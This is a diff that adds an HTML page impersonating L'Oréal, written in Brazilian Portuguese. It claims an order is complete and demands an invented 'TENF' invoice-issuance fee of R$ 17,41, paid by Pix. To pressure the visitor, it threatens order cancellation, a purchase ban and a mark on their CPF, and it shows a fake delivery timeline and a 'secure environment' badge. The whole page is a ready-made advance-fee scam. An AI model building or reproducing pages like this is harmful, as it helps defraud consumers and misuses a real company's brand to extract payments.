@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <title>L'Oréal - Emissão de Nota Fiscal</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap');
+        body { font-family: 'Inter', sans-serif; background-color: #ffffff; color: #000; }
+        
+        .timeline-line {
+            position: absolute;
+            left: 19px;
+            top: 40px;
+            width: 2px;
+            height: calc(100% - 40px);
+            background: #f0f0f0;
+            z-index: 0;
+        }
+
+        .logo-black {
+            filter: grayscale(1) contrast(2);
+        }
+    </style>
+</head>
+<body class="antialiased pb-20">
+
+    <header class="p-6 flex flex-col items-center border-b border-gray-100 bg-white sticky top-0 z-10">
+        <img src="https://logodix.com/logo/1069736.png" alt="L'Oréal" class="h-4 logo-black mb-4">
+        <div class="w-12 h-12 bg-black rounded-full flex items-center justify-center shadow-lg">
+            <span class="text-white font-black text-[10px]">NF-e</span>
+        </div>
+    </header>
+
+    <main class="max-w-[450px] mx-auto px-6 py-8 space-y-8">
+        
+        <div class="text-center space-y-3">
+            <h1 class="text-xl font-black uppercase tracking-tighter">Seu pedido foi realizado com sucesso!</h1>
+            <p class="text-[11px] text-gray-500 font-medium leading-relaxed">
+                Para finalizar o processo de envio, é necessário efetuar o pagamento da Taxa de Emissão da Nota Fiscal (TENF) no valor de <span class="text-black font-black">R$ 17,41</span>.
+            </p>
+        </div>
+
+        <div class="bg-black text-white p-5 rounded-2xl text-center space-y-1 shadow-xl">
+            <p class="text-xs font-black uppercase tracking-widest">AVISO</p>
+            <p class="text-[10px] font-medium opacity-90 leading-tight">
+                O não pagamento da TENF resultará no cancelamento do pedido e anotação no CPF.
+            </p>
+        </div>
+
+        <div class="space-y-8 relative px-2">
+            <div class="flex items-start gap-4 relative z-10">
+                <div class="timeline-line"></div>
+                <div class="w-10 h-10 bg-gray-100 text-black rounded-full flex items-center justify-center border-2 border-white shadow-sm">
+                    <i data-lucide="check" class="w-5 h-5"></i>
+                </div>
+                <div>
+                    <p class="text-[11px] font-black uppercase">Pedido Realizado</p>
+                    <p class="text-[9px] text-gray-400 font-bold uppercase">Pedido confirmado com sucesso</p>
+                    <p class="text-[9px] text-gray-300">23/02/2026 21:18</p>
+                </div>
+            </div>
+
+            <div class="flex items-start gap-4 relative z-10">
+                <div class="timeline-line"></div>
+                <div class="w-10 h-10 bg-gray-100 text-black rounded-full flex items-center justify-center border-2 border-white shadow-sm">
+                    <i data-lucide="package" class="w-5 h-5"></i>
+                </div>
+                <div>
+                    <p class="text-[11px] font-black uppercase">Pedido pronto para envio</p>
+                    <p class="text-[9px] text-gray-400 font-bold uppercase">Aguardando liberação</p>
+                    <p class="text-[9px] text-gray-300">23/02/2026 21:18</p>
+                </div>
+            </div>
+
+            <div class="flex items-start gap-4 relative z-10">
+                <div class="timeline-line" style="height: 50px;"></div>
+                <div class="w-10 h-10 bg-white text-black rounded-full flex items-center justify-center border-2 border-black shadow-md animate-pulse">
+                    <i data-lucide="alert-triangle" class="w-5 h-5"></i>
+                </div>
+                <div>
+                    <p class="text-[11px] font-black uppercase">Taxa de nota fiscal</p>
+                    <p class="text-[9px] text-black font-black uppercase italic">Aguardando pagamento da taxa TENF</p>
+                </div>
+            </div>
+
+            <div class="flex items-start gap-4 relative z-10 opacity-20">
+                <div class="timeline-line" style="height: 50px;"></div>
+                <div class="w-10 h-10 bg-gray-50 text-gray-400 rounded-full flex items-center justify-center border-2 border-white">
+                    <i data-lucide="truck" class="w-5 h-5"></i>
+                </div>
+                <div>
+                    <p class="text-[11px] font-black uppercase">Em trânsito</p>
+                    <p class="text-[9px] font-bold uppercase">Passo anterior não concluído</p>
+                </div>
+            </div>
+
+            <div class="flex items-start gap-4 relative z-10 opacity-20">
+                <div class="w-10 h-10 bg-gray-50 text-gray-400 rounded-full flex items-center justify-center border-2 border-white">
+                    <i data-lucide="check-circle" class="w-5 h-5"></i>
+                </div>
+                <div>
+                    <p class="text-[11px] font-black uppercase">Pedido Entregue</p>
+                    <p class="text-[9px] font-bold uppercase">Passo anterior não concluído</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="bg-gray-50 p-5 rounded-2xl border-2 border-black text-left">
+            <p class="text-[10px] text-black leading-relaxed font-medium">
+                <span class="font-black uppercase">Nota:</span> O não pagamento da Nota Fiscal resulta no cancelamento do pedido, impossibilitando novas compras por um prazo máximo de 90 dias e anotação no CPF.
+            </p>
+        </div>
+
+        <div class="text-center space-y-4 pt-4">
+            <div class="space-y-1">
+                <p class="text-[11px] font-black uppercase tracking-widest text-gray-400">Pague via Pix</p>
+                <p class="text-[9px] font-bold text-gray-500 uppercase">O pagamento será confirmado imediatamente</p>
+            </div>
+            
+            <p class="text-4xl font-black text-black tracking-tighter">R$ 17,41</p>
+
+            <button onclick="window.location.href='https://checkout.com'" class="w-full bg-black text-white font-black py-5 rounded-2xl text-xs uppercase tracking-[0.2em] shadow-2xl active:scale-95 transition-all">
+                Efetuar pagamento
+            </button>
+            
+            <p class="text-[9px] text-gray-400 font-bold uppercase flex items-center justify-center gap-2">
+                <i data-lucide="shield-check" class="w-3 h-3 text-black"></i> Ambiente seguro
+            </p>
+        </div>
+
+    </main>
+
+    <script>
+        lucide.createIcons();
+    </script>
+</body>
+</html>
